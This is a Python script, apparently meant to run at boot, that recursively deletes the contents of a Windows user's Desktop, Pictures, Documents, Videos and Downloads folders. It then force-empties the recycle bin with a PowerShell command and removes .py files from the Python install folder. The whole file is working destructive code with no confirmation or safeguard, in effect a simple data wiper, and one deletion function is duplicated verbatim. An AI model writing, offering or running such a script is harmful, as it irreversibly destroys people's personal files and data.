# Developed By Sence [ 정준호 ] | Do Not Edit insted of Author
# ========== [ 모듈 호출 ] ==========

import os
import stat
import time
import logging

# ========== 주석 [ 알림창 ] ==========

print("Boot Run Success")
print("Boot Deleate Manager On")
print("이 창이 종료될때까지 기다려주세요..")
# ========== User ==========

USER = os.path.expanduser('~')

# =========== 함수 [ 바탕화면 ] =============

def BatangRemoverMaster(folder_path):
    for filename in os.listdir(folder_path):
        file_path = os.path.join(folder_path, filename)
        try:
            if os.path.isfile(file_path) or os.path.islink(file_path):
                ext = os.path.splitext(file_path)[-1].lower()
                if ext in ['.py', '.png', '.jpg']:
                    os.chmod(file_path, stat.S_IWRITE)
                    os.unlink(file_path)
                    print(f"{filename} 삭제 완료")
            elif os.path.isdir(file_path):
                BatangRemoverMaster(file_path)
        except Exception as e:
            print(f"{folder_path} 삭제에 실패했습니다. Error Code : {e}")
    try:
        os.rmdir(folder_path)
        print(f"{folder_path} 폴더 삭제 완료")
    except Exception as e:
        print(f"{folder_path} 삭제에 실패했습니다. Error Code : {e}")
        
# =========== 함수 [ 문서 ] =============

def RemoverMaster(folder_path):
    for filename in os.listdir(folder_path):
        file_path = os.path.join(folder_path, filename)
        try:
            if os.path.isfile(file_path) or os.path.islink(file_path):
                os.chmod(file_path, stat.S_IWRITE)
                os.unlink(file_path)
                print(f"{filename} 삭제 완료")
            elif os.path.isdir(file_path):
                RemoverMaster(file_path)
        except Exception as e:
            print(f"{folder_path} 삭제에 실패했습니다. Error Code : {e}")
    try:
        os.rmdir(folder_path)
        print(f"{folder_path} 폴더 삭제 완료")
    except Exception as e:
        print(f"{folder_path} 삭제에 실패했습니다. Error Code : {e}")

# =========== 함수 [ 문서 ] =============

def RemoverMaster(folder_path):
    for filename in os.listdir(folder_path):
        file_path = os.path.join(folder_path, filename)
        try:
            if os.path.isfile(file_path) or os.path.islink(file_path):
                os.chmod(file_path, stat.S_IWRITE)
                os.unlink(file_path)
                print(f"{filename} 삭제 완료")
            elif os.path.isdir(file_path):
                RemoverMaster(file_path)
        except Exception as e:
            print(f"{folder_path} 삭제에 실패했습니다. Error Code : {e}")
    try:
        os.rmdir(folder_path)
        print(f"{folder_path} 폴더 삭제 완료")
    except Exception as e:
        print(f"{folder_path} 삭제에 실패했습니다. Error Code : {e}")

# ==== 1차 폴더내 .py 파일만 삭제
def delete_py_files(folder_path):
    files = os.listdir(folder_path)
    for file in files:
        file_path = os.path.join(folder_path, file)
        if os.path.isfile(file_path) and file.endswith('.py'):
            os.remove(file_path)
            print(f"{file_path} 삭제 완료")
    
    print(f"Python 폴더 내의 .py 파일 삭제를 완료했습니다.")
def find_folders_with_keyword(folder_path, keyword):
    matching_folders = []

    for root, dirs, files in os.walk(folder_path):
        for dir in dirs:
            if keyword in dir:
                matching_folders.append(os.path.join(root, dir))

    return matching_folders

folder_path = os.path.join(USER,"AppData\\Local\\Programs\\Python")
keyword = 'Python'
matched_folders = find_folders_with_keyword(folder_path, keyword)
NolistPath = ''.join(matched_folders)

# ========== [ RUN ] ==========

DESKTOP = os.path.join(USER,"Desktop")
BatangRemoverMaster(DESKTOP)
print("[ ! ] Desktop Clear")
Pictures = os.path.join(USER,"Pictures")
RemoverMaster(Pictures)
print("[ ! ] Picture Clear")
Documents = os.path.join(USER,"Documents")
RemoverMaster(Documents)
print("[ ! ] Document Clear")
Videos = os.path.join(USER,"Videos")
RemoverMaster(Videos)
print("[ ! ] Video Clear")
Downloads = os.path.join(USER,"Downloads")
RemoverMaster(Downloads)
print("[ ! ] Download Clear")
os.system('PowerShell.exe -Command Clear-RecycleBin -Force')
print("[ ! ] Trashbin Clear")
delete_py_files(NolistPath)
print("[ ! ] All Clear | Developed By Sence")
time.sleep(2)
# Turn On Wile You Need :D
